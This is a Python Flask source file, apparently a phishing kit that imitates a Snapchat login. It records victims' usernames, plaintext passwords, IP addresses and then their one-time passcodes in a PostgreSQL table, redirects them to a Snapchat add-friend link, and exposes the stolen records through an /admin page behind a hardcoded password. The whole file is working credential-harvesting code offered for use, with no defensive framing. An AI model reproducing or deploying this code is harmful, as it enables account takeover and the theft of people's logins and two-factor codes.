from flask import Flask, render_template, request, redirect, url_for, session, flash
import psycopg2
from urllib.parse import urlparse
from datetime import datetime
import os
import re
from dotenv import load_dotenv

load_dotenv()  # لتحميل متغيرات البيئة من ملف .env

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'snapchat-secret-key-2024')

# الاتصال بقاعدة PostgreSQL
def get_connection():
    # Render.com provides DATABASE_URL directly
    database_url = os.environ.get('DATABASE_URL')
    if database_url:
        # Fix for psycopg2 compatibility (postgres:// -> postgresql://)
        if database_url.startswith('postgres://'):
            database_url = database_url.replace('postgres://', 'postgresql://', 1)
        return psycopg2.connect(database_url, sslmode='require')
    else:
        return psycopg2.connect(
            host=os.environ.get('DB_HOST', 'localhost'),
            port=5432,
            dbname=os.environ.get('DB_NAME', 'snapchat'),
            user=os.environ.get('DB_USER', 'postgres'),
            password=os.environ.get('DB_PASSWORD', '')
        )

# إنشاء الجدول عند الحاجة
def init_db():
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS login_attempts (
            id SERIAL PRIMARY KEY,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            timestamp TIMESTAMP NOT NULL,
            ip_address TEXT NOT NULL,
            otp_code TEXT
        )
    ''')
    conn.commit()
    conn.close()

# شغّله في أول مرة فقط
if os.environ.get('INIT_DB', 'false') == 'true':
    init_db()

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def handle_login():
    username = request.form['username']
    password = request.form['password']
    ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    timestamp = datetime.now()

    if not re.match(r'^[A-Za-z0-9_]+$', username) or not re.match(r'^[A-Za-z0-9_]+$', password):
        flash('اسم المستخدم وكلمة المرور يجب أن تكون بالأحرف الإنجليزية فقط.')
        return redirect(url_for('login'))

    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO login_attempts (username, password, timestamp, ip_address)
        VALUES (%s, %s, %s, %s)
        RETURNING id
    ''', (username, password, timestamp, ip_address))
    login_id = cursor.fetchone()[0]
    conn.commit()
    conn.close()

    session['username'] = username
    session['login_id'] = login_id
    return redirect(url_for('otp'))

@app.route('/otp')
def otp():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('otp.html')

@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    otp_code = request.form['otp_code']

    if 'login_id' in session:
        conn = get_connection()
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE login_attempts SET otp_code = %s WHERE id = %s
        ''', (otp_code, session['login_id']))
        conn.commit()
        conn.close()

    return redirect("snapchat://add/maymona19")

@app.route('/admin')
def admin():
    password = request.args.get("pw")
    if password != "A554399a":
        return "Access denied"

    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM login_attempts ORDER BY timestamp DESC')
    attempts = cursor.fetchall()
    conn.close()

    return render_template('admin.html', attempts=attempts)

if __name__ == '__main__':
    app.run(debug=True)
